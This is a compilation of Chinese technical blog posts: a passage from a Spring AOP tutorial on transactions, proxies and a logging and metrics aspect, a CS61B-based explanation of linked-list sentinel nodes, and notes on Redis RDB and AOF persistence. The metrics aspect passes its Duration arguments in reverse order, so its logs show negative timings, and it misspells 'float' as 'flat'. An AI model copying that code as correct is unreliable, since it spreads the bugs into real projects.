                           <artifactId>spring-aspects</artifactId>
                       </aspectLibrary>
                   </aspectLibraries>
               </configuration>
               <executions>
                   <execution>
                       <goals>
                           <goal>compile</goal>
                           <goal>test-compile</goal>
                       </goals>
                   </execution>
               </executions>
           </plugin>
   </plugins>
</build>
这里的一个坑是ajc编译器无法支持lambok，我们需要先使用lombok的插件在生成源码阶段对lombok代码进行预处理，然后我们再通过aspjectj插件来编译代码。Pom文件中还需要加入如下依赖：
<dependency>
    <groupId>org.springframework</groupId>
    <artifactId>spring-aspects</artifactId>
</dependency>
然后需要配置Spring来使用ASPECTJ的增强方式来做事务管理：
@EnableTransactionManagement(mode = AdviceMode.ASPECTJ)
public class Spring101AopApplication implements CommandLineRunner {
重新使用maven编译代码后可以看到，相关代码已经变了样：
@Transactional(
    rollbackFor = {Exception.class}
)
public void _insertData(boolean success) {
    AnnotationTransactionAspect var10000 = AnnotationTransactionAspect.aspectOf();
    Object[] var3 = new Object[]{this, Conversions.booleanObject(success)};
    var10000.ajc$around$org_springframework_transaction_aspectj_AbstractTransactionAspect$1$2a73e96c(this, new MyServiceImpl$AjcClosure1(var3), ajc$tjp_0);
}

public void insertData(boolean success) {
    try {
        this._insertData(success);
    } catch (Exception var3) {
        var3.printStackTrace();
    }

    System.out.println("记录数：" + this.dbMapper.personCount());
}
运行程序可以看到如下日志：
2018-10-07 09:35:12.360 DEBUG 19459 --- [           main] o.m.s.t.SpringManagedTransaction         : JDBC Connection [HikariProxyConnection@1169317628 wrapping conn0: url=jdbc:h2:mem:testdb user=SA] will be managed by Spring
而且最后输出的结果是2，说明第二次插入数据整体回滚了。
如果使用IDEA的话还可以配置先由javac编译再由ajc后处理，具体参见IDEA官网这里不详述。

使用AOP进行事务后处理
我们先使用刚才说的方法3改造一下代码，使得Spring AOP可以处理事务（Aspject AOP功能虽然强大但是和Spring结合的不好，所以我们接下去的测试还是使用Spring AOP），删除aspjectj相关依赖，在IDEA配置回javac编译器重新编译项目。本节中我们尝试建立第一个我们的切面：
package me.josephzhu.spring101aop;

import lombok.extern.slf4j.Slf4j;
import org.aspectj.lang.JoinPoint;
import org.aspectj.lang.annotation.Aspect;
import org.aspectj.lang.annotation.Before;
import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.stereotype.Component;
import org.springframework.transaction.support.TransactionSynchronizationAdapter;
import org.springframework.transaction.support.TransactionSynchronizationManager;

@Aspect
@Component
@Slf4j
class TransactionalAspect extends TransactionSynchronizationAdapter {

    @Autowired
    private DbMapper dbMapper;

    private ThreadLocal<JoinPoint> joinPoint = new ThreadLocal<>();

    @Before("@within(org.springframework.transaction.annotation.Transactional) || @annotation(org.springframework.transaction.annotation.Transactional)")
    public void registerSynchronization(JoinPoint jp) {
        joinPoint.set(jp);
        TransactionSynchronizationManager.registerSynchronization(this);
    }

    @Override
    public void afterCompletion(int status) {
        log.info(String.format("【%s】【%s】事务提交 %s，目前记录数：%s",
                joinPoint.get().getSignature().getDeclaringType().toString(),
                joinPoint.get().getSignature().toLongString(),
                status == 0 ? "成功":"失败",
                dbMapper.personCount()));
        joinPoint.remove();
    }
}
在这里，我们的切点是所有标记了@Transactional注解的类以及标记了@Transactional注解的方法，我们的增强比较简单，在事务同步管理器注册一个回调方法，用于事务完成后进行额外的处理。这里的一个坑是Spring如何实例化切面。通过查文档或做实验可以得知，默认情况下TranscationalAspect是单例的，在多线程情况下，可能会有并发，保险起见我们使用ThreadLocal来存放。运行代码后可以看到如下输出：
2018-10-07 10:01:32.384  INFO 19599 --- [           main] m.j.spring101aop.TransactionalAspect     : 【class me.josephzhu.spring101aop.MyServiceImpl】【public void me.josephzhu.spring101aop.MyServiceImpl.insertData(boolean)】事务提交 成功，目前记录数：2
2018-10-07 10:01:32.385 DEBUG 19599 --- [           main] o.m.s.t.SpringManagedTransaction         : JDBC Connection [HikariProxyConnection@1430104337 wrapping conn0: url=jdbc:h2:mem:testdb user=SA] will be managed by Spring
2018-10-07 10:01:32.449 DEBUG 19599 --- [           main] o.m.s.t.SpringManagedTransaction         : JDBC Connection [HikariProxyConnection@1430104337 wrapping conn0: url=jdbc:h2:mem:testdb user=SA] will be managed by Spring
2018-10-07 10:01:32.449  INFO 19599 --- [           main] m.j.spring101aop.TransactionalAspect     : 【class me.josephzhu.spring101aop.MyServiceImpl】【public void me.josephzhu.spring101aop.MyServiceImpl.insertData(boolean)】事务提交 失败，目前记录数：2
可以看到Spring AOP做了事务管理，我们两次事务提交第一次成功第二次失败，失败后记录数还是2。这个功能还可以通过Spring的@TransactionalEventListener注解实现，这里不详述。
切换JDK代理和CGLIB代理
我们现在注入的是接口，我们知道对于这种情况Spring AOP应该使用的是JDK代理。但是SpringBoot默认开启了下面的属性来全局启用CGLIB代理：
spring.aop.proxy-target-class=true
我们尝试把这个属性设置成false，然后在刚才的TransationalAspect中的增强方法设置断点，可以看到这是一个ReflectiveMethodInvocation：

把配置改为true重新观察可以看到变为了CglibMethodInvocation：

我们把开关改为false，然后切换到注入实现，运行程序会得到如下错误提示，意思就是我我们走JDK代理的话不能注入实现，需要注入接口：
The bean 'myServiceImpl' could not be injected as a 'me.josephzhu.spring101aop.MyServiceImpl' because it is a JDK dynamic proxy that implements:
    me.josephzhu.spring101aop.MyService
我们修改我们的MyServiceImpl，去掉实现接口的代码和@Override注解，使之成为一个普通的类，重新运行程序可以看到我们的代理方式自动降级为了CGLIB方式（虽然spring.aop.proxy-target-class参数我们现在设置的是false）。
使用AOP无缝实现日志+异常+打点
现在我们来实现一个复杂点的切面的例子。我们知道，出错记录异常信息，对于方法调用记录打点信息（如果不知道什么是打点可以参看《朱晔的互联网架构实践心得S1E4：简单好用的监控六兄弟》），甚至有的时候为了排查问题需要记录方法的入参和返回，这三个事情是我们经常需要做的和业务逻辑无关的事情，我们可以尝试使用AOP的方式一键切入这三个事情的实现，在业务代码无感知的情况下做好监控和打点。
首先实现我们的注解，通过这个注解我们可以细化控制一些功能：
package me.josephzhu.spring101aop;

import java.lang.annotation.ElementType;
import java.lang.annotation.Retention;
import java.lang.annotation.RetentionPolicy;
import java.lang.annotation.Target;

@Retention(RetentionPolicy.RUNTIME)
@Target(ElementType.METHOD)
public @interface Metrics {
    /**
     * 是否在成功执行方法后打点
     * @return
     */
    boolean recordSuccessMetrics() default true;

    /**
     * 是否在执行方法出错时打点
     * @return
     */
    boolean recordFailMetrics() default true;

    /**
     * 是否记录请求参数
     * @return
     */
    boolean logParameters() default true;

    /**
     * 是否记录返回值
     * @return
     */
    boolean logReturn() default true;

    /**
     * 是否记录异常
     * @return
     */
    boolean logException() default true;

    /**
     * 是否屏蔽异常返回默认值
     * @return
     */
    boolean ignoreException() default false;
}
下面我们就来实现这个切面：
package me.josephzhu.spring101aop;

import com.fasterxml.jackson.databind.ObjectMapper;
import lombok.extern.slf4j.Slf4j;
import org.aspectj.lang.ProceedingJoinPoint;
import org.aspectj.lang.annotation.Around;
import org.aspectj.lang.annotation.Aspect;
import org.aspectj.lang.reflect.MethodSignature;
import org.springframework.core.annotation.Order;
import org.springframework.stereotype.Component;
import org.springframework.web.context.request.RequestAttributes;
import org.springframework.web.context.request.RequestContextHolder;
import org.springframework.web.context.request.ServletRequestAttributes;

import javax.servlet.http.HttpServletRequest;
import java.lang.annotation.Annotation;
import java.lang.reflect.Method;
import java.time.Duration;
import java.time.Instant;

@Aspect
@Component
@Slf4j
public class MetricsAspect {
    private static ObjectMapper objectMapper = new ObjectMapper();

    @Around("@annotation(me.josephzhu.spring101aop.Metrics) || @within(org.springframework.stereotype.Controller)")
    public Object metrics(ProceedingJoinPoint pjp) throws Throwable {
        //1
        MethodSignature signature = (MethodSignature) pjp.getSignature();
        Metrics metrics;
        String name;
        if (signature.getDeclaringType().isInterface()) {
            Class implClass = pjp.getTarget().getClass();
            Method method = implClass.getMethod(signature.getName(), signature.getParameterTypes());
            metrics = method.getDeclaredAnnotation(Metrics.class);
            name = String.format("【%s】【%s】", implClass.toString(), method.toString());
        } else {
            metrics = signature.getMethod().getAnnotation(Metrics.class);
            name = String.format("【%s】【%s】", signature.getDeclaringType().toString(), signature.toLongString());
        }
        //2
        if (metrics == null)
            metrics = new Metrics() {
                @Override
                public boolean logException() {
                    return true;
                }

                @Override
                public boolean logParameters() {
                    return true;
                }

                @Override
                public boolean logReturn() {
                    return true;
                }

                @Override
                public boolean recordFailMetrics() {
                    return true;
                }

                @Override
                public boolean recordSuccessMetrics() {
                    return true;
                }

                @Override
                public boolean ignoreException() {
                    return false;
                }

                @Override
                public Class<? extends Annotation> annotationType() {
                    return Metrics.class;
                }
            };
        RequestAttributes requestAttributes = RequestContextHolder.getRequestAttributes();
        if (requestAttributes != null) {
            HttpServletRequest request = ((ServletRequestAttributes) requestAttributes).getRequest();
            if (request != null)
                name += String.format("【%s】", request.getRequestURL().toString());
        }
        //3
        if (metrics.logParameters())
            log.info(String.format("【入参日志】调用 %s 的参数是：【%s】", name, objectMapper.writeValueAsString(pjp.getArgs())));
        //4
        Object returnValue;
        Instant start = Instant.now();
        try {
            returnValue = pjp.proceed();
            if (metrics.recordSuccessMetrics())
                log.info(String.format("【成功打点】调用 %s 成功，耗时：%s", name, Duration.between(Instant.now(), start).toString()));
        } catch (Exception ex) {
            if (metrics.recordFailMetrics())
                log.info(String.format("【失败打点】调用 %s 失败，耗时：%s", name, Duration.between(Instant.now(), start).toString()));

            if (metrics.logException())
                log.error(String.format("【异常日志】调用 %s 出现异常！", name), ex);

            if (metrics.ignoreException())
                returnValue = getDefaultValue(signature.getReturnType().toString());
            else
                throw ex;
        }
        //5
        if (metrics.logReturn())
            log.info(String.format("【出参日志】调用 %s 的返回是：【%s】", name, returnValue));
        return returnValue;
    }

    private static Object getDefaultValue(String clazz) {
        if (clazz.equals("boolean")) {
            return false;
        } else if (clazz.equals("char")) {
            return '\u0000';
        } else if (clazz.equals("byte")) {
            return 0;
        } else if (clazz.equals("short")) {
            return 0;
        } else if (clazz.equals("int")) {
            return 0;
        } else if (clazz.equals("long")) {
            return 0L;
        } else if (clazz.equals("flat")) {
            return 0.0F;
        } else if (clazz.equals("double")) {
            return 0.0D;
        } else {
            return null;
        }
    }

}
看上去代码量很多，其实实现比较简单：

最关键的切点，我们在两个点切入，一是标记了Metrics注解的方法，二是标记了Controller的类（我们希望实现的目标是对于Controller所有方法默认都加上这个功能，因为这是对外的接口，比较重要）。所以在之后的代码中，我们还需要额外对Web程序做一些处理。
对于@Around我们的参数是ProceedingJoinPoint不是JoinPoint，因为环绕增强允许我们执行方法调用。
第一段代码，我们尝试获取当前方法的类名和方法名。这里有一个坑，如果连接点是接口的话，@Metrics的定义需要从实现类（也就是代理的Target）上获取。作为框架的开发者，我们需要考虑到各种使用方使用的情况，如果有遗留的话就会出现BUG。
第二段代码，是为Web项目准备的，如果我们希望默认为所有的Controller方法做日志异常打点处理的话，我们需要初始化一个@Metrics注解出来，然后对于Web项目我们可以从上下文中获取到额外的一些信息来丰富我们的日志。
第三段代码，实现的是入参的日志输出。
第四段代码，实现的是连接点方法的执行，以及成功失败的打点，出现异常的时候还会记录日志。这里我们通过日志方式暂时替代了打点的实现，标准的实现是需要把信息提交到类似Graphite这样的时间序列数据库或对接SpringBoot Actuator。另外，如果开启忽略异常的话，我们需要把结果替换为返回类型的默认值，并且吃掉异常。
第五段代码，实现了返回值的日志输出。
最后，我们修改一下MyServiceImpl的实现，在insertData和getData两个方法上加入我们的@Metrics注解。运行程序可以看到如下输出：

2018-10-07 10:47:00.813  INFO 19737 --- [           main] me.josephzhu.spring101aop.MetricsAspect  : 【入参日志】调用 【class me.josephzhu.spring101aop.MyServiceImpl】【public void me.josephzhu.spring101aop.MyServiceImpl.insertData(boolean)】 的参数是：【[true]】
2018-10-07 10:47:00.864  INFO 19737 --- [           main] me.josephzhu.spring101aop.MetricsAspect  : 【成功打点】调用 【class me.josephzhu.spring101aop.MyServiceImpl】【public void me.josephzhu.spring101aop.MyServiceImpl.insertData(boolean)】 成功，耗时：PT-0.048S
2018-10-07 10:47:00.864  INFO 19737 --- [           main] me.josephzhu.spring101aop.MetricsAspect  : 【出参日志】调用 【class me.josephzhu.spring101aop.MyServiceImpl】【public void me.josephzhu.spring101aop.MyServiceImpl.insertData(boolean)】 的返回是：【null】
2018-10-07 10:47:00.927  INFO 19737 --- [           main] me.josephzhu.spring101aop.MetricsAspect  : 【入参日志】调用 【class me.josephzhu.spring101aop.MyServiceImpl】【public void me.josephzhu.spring101aop.MyServiceImpl.insertData(boolean)】 的参数是：【[false]】
2018-10-07 10:47:01.084  INFO 19737 --- [           main] me.josephzhu.spring101aop.MetricsAspect  : 【失败打点】调用 【class me.josephzhu.spring101aop.MyServiceImpl】【public void me.josephzhu.spring101aop.MyServiceImpl.insertData(boolean)】 失败，耗时：PT-0.156S
2018-10-07 10:47:01.102 ERROR 19737 --- [           main] me.josephzhu.spring101aop.MetricsAspect  : 【异常日志】调用 【class me.josephzhu.spring101aop.MyServiceImpl】【public void me.josephzhu.spring101aop.MyServiceImpl.insertData(boolean)】 出现异常！
2018-10-07 10:47:01.231  INFO 19737 --- [           main] me.josephzhu.spring101aop.MetricsAspect  : 【入参日志】调用 【class me.josephzhu.spring101aop.MyServiceImpl】【public java.util.List me.josephzhu.spring101aop.MyServiceImpl.getData(me.josephzhu.spring101aop.MyBean,int,java.time.Duration)】 的参数是：【[{"id":0,"name":"zhuye","age":35,"balance":1000},5,{"seconds":1,"zero":false,"nano":0,"units":["SECONDS","NANOS"],"negative":false}]】
2018-10-07 10:47:02.237  INFO 19737 --- [           main] me.josephzhu.spring101aop.MetricsAspect  : 【成功打点】调用 【class me.josephzhu.spring101aop.MyServiceImpl】【public java.util.List me.josephzhu.spring101aop.MyServiceImpl.getData(me.josephzhu.spring101aop.MyBean,int,java.time.Duration)】 成功，耗时：PT-1.006S
2018-10-07 10:47:02.237  INFO 19737 --- [           main] me.josephzhu.spring101aop.MetricsAspect  : 【出参日志】调用 【class me.josephzhu.spring101aop.MyServiceImpl】【public java.util.List me.josephzhu.spring101aop.MyServiceImpl.getData(me.josephzhu.spring101aop.MyBean,int,java.time.Duration)】 的返回是：【[MyBean(id=1, name=zhuye1, age=35, balance=1000), MyBean(id=2, name=zhuye2, age=35, balance=1000), MyBean(id=3, name=zhuye3, age=35, balance=1000), MyBean(id=4, name=zhuye4, age=35, balance=1000), MyBean(id=5, name=zhuye5, age=35, balance=1000)]】
[MyBean(id=1, name=zhuye1, age=35, balance=1000), MyBean(id=2, name=zhuye2, age=35, balance=1000), MyBean(id=3, name=zhuye3, age=35, balance=1000), MyBean(id=4, name=zhuye4, age=35, balance=1000), MyBean(id=5, name=zhuye5, age=35, balance=1000)]
正确实现了参数日志、异常日志、成功失败打点（含耗时统计）等功能。
下面我们创建一个Controller来测试一下是否可以自动切入Controller：
package me.josephzhu.spring101aop;

import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.stereotype.Controller;
import org.springframework.web.bind.annotation.GetMapping;
import org.springframework.web.bind.annotation.ResponseBody;

import java.util.List;

@Controller
public class MyController {

    @Autowired
    private DbMapper dbMapper;

    @ResponseBody
    @GetMapping("/data")
    public List<MyBean> getPersonList(){
        return dbMapper.getPersonList();
    }
}
运行程序打开浏览器访问http://localhost:8080/data后能看到如下输出：
2018-10-07 10:49:53.811  INFO 19737 --- [nio-8080-exec-1] me.josephzhu.spring101aop.MetricsAspect  : 【入参日志】调用 【class me.josephzhu.spring101aop.MyController】【public java.util.List me.josephzhu.spring101aop.MyController.getPersonList()】【http://localhost:8080/data】 的参数是：【[]】
2018-10-07 10:49:53.819  INFO 19737 --- [nio-8080-exec-1] me.josephzhu.spring101aop.MetricsAspect  : 【成功打点】调用 【class me.josephzhu.spring101aop.MyController】【public java.util.List me.josephzhu.spring101aop.MyController.getPersonList()】【http://localhost:8080/data】 成功，耗时：PT-0.008S
2018-10-07 10:49:53.819  INFO 19737 --- [nio-8080-exec-1] me.josephzhu.spring101aop.MetricsAspect  : 【出参日志】调用 【class me.josephzhu.spring101aop.MyController】【public java.util.List me.josephzhu.spring101aop.MyController.getPersonList()】【http://localhost:8080/data】 的返回是：【[MyBean(id=1, name=zhuye, age=35, balance=1000), MyBean(id=2, name=zhuye, age=35, balance=1000)]】
最后，我们再来踩一个坑。我们来测一下ignoreException吞掉异常的功能（默认为false）：
@Transactional(rollbackFor = Exception.class)
@Override
@Metrics(ignoreException = true)
public void insertData(boolean success){
    dbMapper.personInsertWithoutId();
    if(!success)
        dbMapper.personInsertWithId();
}
这个功能会吞掉异常，在和Transactional事务管理结合时候会不会出问题呢？
开启这个配置后刷新页面可以看到数据库内有三条记录了，说明第二次的insertData方法执行没有成功回滚事务。这也是合情合理的，毕竟我们的MetricsAspect吃掉了异常。

怎么绕开这个问题呢？答案是我们需要手动控制一下我们的切面的执行优先级，我们希望这个切面优先级比Spring事务控制切面优先级低：
@Aspect
@Component
@Slf4j
@Order(1)
public class MetricsAspect {
再次运行程序可以看到事务正确回滚。
总结
本文我们通过一些例子覆盖了如下内容：

Spring AOP的一些基本知识点。
Mybatis和H2的简单配置使用。
如何实现Spring事务管理。
如何切换为AspjectJ进行AOP。
观察JDK代理和CGLIB代理。
如何定义切面实现事务后处理和日志异常打点这种横切关注点。

在整个过程中，也踩了下面的坑，印证的本文的标题：

Spring AOP代理不能作用于代理类内部this方法调用的坑。
Spring AOP实例化切面默认单例的坑。
AJC编译器无法支持lambok的坑。
切面优先级顺序的坑。
切面内部获取注解方式的坑。

老样子，本系列文章代码见我的github：https://github.com/JosephZhu1983/Spring101。

********************************************************************************************************************************************************************************************************
关于链表中哨兵结点问题的深入剖析
最近正在学习UC Berkeley的CS61B这门课，主要是采用Java语言去实现一些数据结构以及运用数据结构去做一些project。这门课不仅告诉你这个东西怎么做，而且一步一步探寻为什么要这样做以及为什么会有这些功能。我们有时在接触某段代码或功能的实现时，可能直接就看到了它最终的面貌，而不知道如何一步步演化而来，其实每一个功能的添加或优化都是对应一个问题的解决。下面就这门课中关于链表中哨兵结点的相关问题进行总结。
什么是哨兵结点
哨兵顾名思义有巡逻、检查的功能，在我们程序中通过增加哨兵结点往往能够简化边界条件，从而防止对特殊条件的判断，使代码更为简便优雅，在链表中应用最为典型。

单链表中的哨兵结点
首先讨论哨兵结点在单链表中的运用，如果不加哨兵结点在进行头尾删除和插入时需要进行特殊判断。比如在尾部插入结点的代码如下：
void addLast(int x) {
    if (first == null) {
        first = new Node(x, null);
        return;
    }
    Node p = first;
    while (p.next != null) {
        p = p.next;
    }
    p.next = new Node(x, null);
}
如上所示需要对结点为空的特殊情况进行判断，头部加了一个哨兵结点后就可以不需要判断了（不会为空）

双链表中的哨兵结点
Version 1: 双哨兵
在双链表中需要能够在头部和尾部分别进行插入删除操作（可以实现双端队列），为了能快速在尾部进行插入删除，需要引入指向尾部的指针。截图如下（图片来自CS61B）


上述增加了一个指向尾部的last结点，从上图可以看出一个问题，last结点有时指向哨兵结点，有时指向实际结点。这会导致特殊情况的出现，比如在进行addFirst操作时，last指向哨兵结点时插入后需要将last往后移动一个，而第二张图指向实际结点时在头部插入结点后并不需要改变last指针。这时需要在尾部后也引入一个哨兵结点，以使其一致。相应示意图如下：


Version 2：循环双链表
上述Version1需要两个哨兵结点，可以对其进行改进。可以使用头部结点的prev指针指向尾部，尾部结点的next指针指向哨兵，这样就只需要一个哨兵结点，使链表变成循环链表，比Version1更为简洁优雅。


在对如上所示进行插入和删除操作时一定要格外注意，自己在写的时候很容易就漏掉某个指针的关系设置，最好在纸上自己画一遍。（对于要改变的连接可能会影响其他的，这时可将其暂存或最好设置）
在头部插入的代码如下：
   public void addFirst(Item item) {
        Node node = new Node(item);
        node.prev = sentinel;
        node.next = sentinel.next;
        sentinel.next.prev = node;
        sentinel.next = node;
        size++;
    }
尾部插入代码如下：
    public void addLast(Item item) {
        Node node = new Node(item);
        node.prev = sentinel.prev;
        node.next = sentinel;
        sentinel.prev.next = node;
        sentinel.prev = node;
        size++;
    }
头部删除代码如下：
   public Item removeFirst() {
        Item item = sentinel.next.item;
        sentinel.next = sentinel.next.next;
        sentinel.next.prev = sentinel;
        size--;
        return item;
    }
尾部删除代码如下
    public Item removeLast() {
        Item item = sentinel.prev.item;
        Node sl = sentinel.prev.prev;
        sl.next = sl.next.next;
        sl.next.prev = sl;
        size--;
        return item;
    }
总结与感想
（1）虽然看起来很小很简单的事情，但实现起来却有很多细小问题可以考虑，学会把一件小事做的很漂亮。（small but smart）
（2）学会分析一个东西的来龙去脉，为什么会有这部分，以及怎么改进的。
参考：
1.cs61b:https://joshhug.gitbooks.io/hug61b/content/chap2/chap23.html
2.算法导论10.2链表

********************************************************************************************************************************************************************************************************
Redis的持久化
RDB
RDB是将当前数据生成快照保存到硬盘上。
 
RDB的工作流程：
1. 执行bgsave命令，Redis父进程判断当前是否存在正在执行的子进程，如RDB/AOF子进程，如果存在bgsave命令直接返回。
2. 父进程执行fork操作创建子进程，fork操作过程中父进程被阻塞。
3. 父进程fork完成后，bgsave命令返回“* Background saving started by pid xxx”信息，并不再阻塞父进程，可以继续响应其他命令。
4. 父进程创建RDB文件，根据父进程内存生成临时快照文件，完成后对原有文件进行原子替换。根据lastsave命令可以获取最近一次生成RDB的时间，对应info Persistence中的rdb_last_save_time。
5. 进程发送信号给父进程表示完胜，父进程更新统计信息。
 
对于大多数操作系统来说，fork都是个重量级操作，虽然创建的子进程不需要拷贝父进程的物理内存空间，但是会复制父进程的空间内存页表。
子进程通过fork操作产生，占用内存大小等同于父进程，理论上需要两倍的内存来完成持久化操作，但Linux有写时复制机制（copy-on-write）。父子进程会共享相同的物理内存页，当父进程处理写请求时会把要修改的页创建副本，而子进程在fork操作过程中会共享父进程的内存快照。
 
触发机制：
1. 手动触发
   包括save和bgsave命令。
    因为save会阻塞当前Redis节点，所以，Redis内部所有涉及RDB持久化的的操作都通过bgsave方式，save方式已废弃。
2. 自动触发
    1> 使用save的相关配置。
    2> 从节点执行全量复制操作。
    3> 执行debug reload命令。
    4> 执行shutdown命令时，如果没有开启AOF持久化功能则会自动执行bgsave。
 
RDB的优缺点：
优点：
1. RDB是一个紧凑压缩的二进制文件，代表Redis在某个时间点上的数据快照，适合备份，全量复制等场景。
2. 加载RDB恢复数据远远快于AOF的方式。
缺点：
没办法做到实时持久化/秒级持久化，因为bgsave每次运行都要执行fork操作创建子进程，属于重量级操作，频繁执行成本过高。
 
RDB的相关参数

save 900 1
save 300 10
save 60 10000

stop-writes-on-bgsave-error yes

rdbcompression yes

rdbchecksum yes

dbfilename dump.rdb

dir ./

 
其中，前三个参数的含义是，

#   after 900 sec (15 min) if at least 1 key changed
#   after 300 sec (5 min) if at least 10 keys changed
#   after 60 sec if at least 10000 keys changed

 
如果要禁用RDB的自动触发，可注销这三个参数，或者设置save ""。
stop-writes-on-bgsave-error：在开启RDB且最近一次bgsave执行失败的情况下，如果该参数为yes，则Redis会阻止客户端的写入，直到bgsave执行成功。
rdbcompression：使用LZF算法压缩字符对象。
rdbchecksum：从RDB V5开始，在保存RDB文件时，会在文件末尾添加CRC64校验和，这样，能较容易的判断文件是否被损坏。但同时，对于带有校验和的RDB文件的保存和加载，会有10%的性能损耗。
dbfilename： RDB文件名。
dir：RDB文件保存的目录。
 
RDB的相关变量

127.0.0.1:6379> info Persistence
# Persistence
loading:0
rdb_changes_since_last_save:0
rdb_bgsave_in_progress:0
rdb_last_save_time:1538447605
rdb_last_bgsave_status:ok
rdb_last_bgsave_time_sec:0
rdb_current_bgsave_time_sec:-1
rdb_last_cow_size:155648

其含义如下：
loading: Flag indicating if the load of a dump file is on-going。是否在加载RDB文件
rdb_changes_since_last_save: Number of changes since the last dump。
rdb_bgsave_in_progress: Flag indicating a RDB save is on-going。是否在执行bgsave操作。
rdb_last_save_time: Epoch-based timestamp of last successful RDB save。最近一次bgsave操作时的时间戳。
rdb_last_bgsave_status: Status of the last RDB save operation。最近一次bgsave是否执行成功。
rdb_last_bgsave_time_sec: Duration of the last RDB save operation in seconds。最近一次bgsave操作花费的时间。
rdb_current_bgsave_time_sec: Duration of the on-going RDB save operation if any。当前bgsave操作已经执行的时间。
rdb_last_cow_size: The size in bytes of copy-on-write allocations during the last RBD save operation。COW的大小。指的是父进程与子进程相比执行了多少修改，包括读取缓冲区，写入缓冲区，数据修改等。
 
AOF
与RDB不一样的是，AOF记录的是命令，而不是数据。需要注意的是，其保存的是Redis Protocol，而不是直接的Redis命令。但是以文本格式保存。
 
如何开启AOF
只需将appendonly设置为yes就行。
 
AOF的工作流程：
1. 所有的写入命令追加到aof_buf缓冲区中。
2. AOF会根据对应的策略向磁盘做同步操作。刷盘策略由appendfsync参数决定。
3. 定期对AOF文件进行重写。重写策略由auto-aof-rewrite-percentage，auto-aof-rewrite-min-size两个参数决定。
 
appendfsync参数有如下取值：
no: don't fsync, just let the OS flush the data when it wants. Faster. 只调用系统write操作，不对AOF文件做fsync操作，同步硬盘操作由操作系统负责，通常同步周期最长为30s。
always: fsync after every write to the append only log. Slow, Safest. 命令写入到aof_buf后，会调用系统fsync操作同步到文件中。
everysec: fsync only one time every second. Compromise. 只调用系统write操作，fsync同步文件操作由专门进程每秒调用一次。
默认值为everysec，也是建议值。
 
重写机制
为什么要重写？重写后可以加快节点启动时的加载时间。
重写后的文件为什么可以变小？
1. 进程内超时的数据不用再写入到AOF文件中。
2. 存在删除命令。
3. 多条写命令可以合并为一个。
 
重写条件：
1. 手动触发
     直接调用bgrewriteaof命令。
2. 自动触发。
    与auto-aof-rewrite-percentage，auto-aof-rewrite-min-size两个参数有关。
    触发条件，aof_current_size > auto-aof-rewrite-min-size 并且 (aof_current_size  - aof_base_size) / aof_base_size >= auto-aof-rewrite-percentage。
    其中，aof_current_size是当前AOF文件大小，aof_base_size 是上一次重写后AOF文件的大小，这两部分的信息可从info Persistence处获取。
 
AOF重写的流程。
1. 执行AOF重写请求。
    如果当前进程正在执行bgsave操作，重写命令会等待bgsave执行完后再执行。
2. 父进程执行fork创建子进程。
3. fork操作完成后，主进程会继续响应其它命令。所有修改命令依然会写入到aof_buf中，并根据appendfsync策略持久化到AOF文件中。
4. 因fork操作运用的是写时复制技术，所以子进程只能共享fork操作时的内存数据，对于fork操作后，生成的数据，主进程会单独开辟一块aof_rewrite_buf保存。
5. 子进程根据内存快照，按照命令合并规则写入到新的AOF文件中。每次批量写入磁盘的数据量由aof-rewrite-incremental-fsync参数控制，默认为32M，避免单次刷盘数据过多造成硬盘阻塞。
6. 新AOF文件写入完成后，子进程发送信号给父进程，父进程更新统计信息。
7. 父进程将aof_rewrite_buf（AOF重写缓冲区）的数据写入到新的AOF文件中。
8. 使用新AOF文件替换老文件，完成AOF重写。
实际上，当Redis节点执行完一个命令后，它会同时将这个写命令发送到AOF缓冲区和AOF重写缓冲区。
 
Redis通过AOF文件还原数据库的流程。
1.  创建一个不带网络连接的伪客户端。因为Redis的命令只能在客户端上下文中执行。
2. 从AOF文件中分析并读取一条命令。
3. 使用伪客户端执行该命令。
4. 反复执行步骤2,3，直到AOF文件中的所有命令都被处理完。 
 
注意：AOF的持久化也可能会造成阻塞。
AOF常用的持久化策略是everysec，在这种策略下，fsync同步文件操作由专门线程每秒调用一次。当系统磁盘较忙时，会造成Redis主线程阻塞。
1. 主线程负责写入AOF缓冲区。
2. AOF线程负责每秒执行一次同步磁盘操作，并记录最近一次同步时间。
3. 主线程负责对比上次AOF同步时间。
   1> 如果距上次同步成功时间在2s内，主线程直接返回。
   2> 如果距上次同步成功时间超过2s，主线程会阻塞，直到同步操作完成。每出现一次阻塞，info Persistence中aof_delayed_fsync的值都会加1。
所以，使用everysec策略最多会丢失2s数据，而不是1s。
 
AOF的相关变量

127.0.0.1:6379> info Persistence
# Persistence
...
aof_enabled:1
aof_rewrite_in_progress:0
aof_rewrite_scheduled:0
aof_last_rewrite_time_sec:-1
aof_current_rewrite_time_sec:-1
aof_last_bgrewrite_status:ok
aof_last_write_status:ok
aof_last_cow_size:0
aof_current_size:19276803
aof_base_size:19276803
aof_pending_rewrite:0
aof_buffer_length:0
aof_rewrite_buffer_length:0
aof_pending_bio_fsync:0
aof_delayed_fsync:0

其含义如下，
aof_enabled: Flag indicating AOF logging is activated. 是否开启AOF
aof_rewrite_in_progress: Flag indicating a AOF rewrite operation is on-going. 是否在进行AOF的重写操作。
aof_rewrite_scheduled: Flag indicating an AOF rewrite operation will be scheduled once the on-going RDB save is complete. 是否有AOF操作等待执行。
aof_last_rewrite_time_sec: Duration of the last AOF rewrite operation in seconds. 最近一次AOF重写操作消耗的时间。
aof_current_rewrite_time_sec: Duration of the on-going AOF rewrite operation if any. 当前正在执行的AOF操作已经消耗的时间。
aof_last_bgrewrite_status: Status of the last AOF rewrite operation. 最近一次AOF重写操作是否执行成功。
aof_last_write_status: Status of the last write operation to the AOF. 最近一次追加操作是否执行成功。
aof_last_cow_size: The size in bytes of copy-on-write allocations during the last AOF rewrite operation. 在执行AOF重写期间，分配给COW的大小。
 
如果开启了AOF，还会增加以下变量
aof_current_size: AOF current file size. AOF的当前大小。
aof_base_size: AOF file size on latest startup or rewrite. 最近一次重写后AOF的大小。
aof_pending_rewrite: Flag indicating an AOF rewrite operation will be scheduled once the on-going RDB save is complete.是否有AOF操作在等待执行。
aof_buffer_length: Size of the AOF buffer. AOF buffer的大小
aof_rewrite_buffer_length: Size of the AOF rewrite buffer. AOF重写buffer的大小。
aof_pending_bio_fsync: Number of fsync pending jobs in background I/O queue. 在等待执行的fsync操作的数量。
aof_delayed_fsync: Delayed fsync counter. Fsync操作延迟执行的次数。
如果一个load操作在进行，还会增加以下变量loading_start_time: Epoch-based timestamp of the start of the load operation. Load操作开始的时间。
loading_total_bytes: Total file size. 文件的大小。
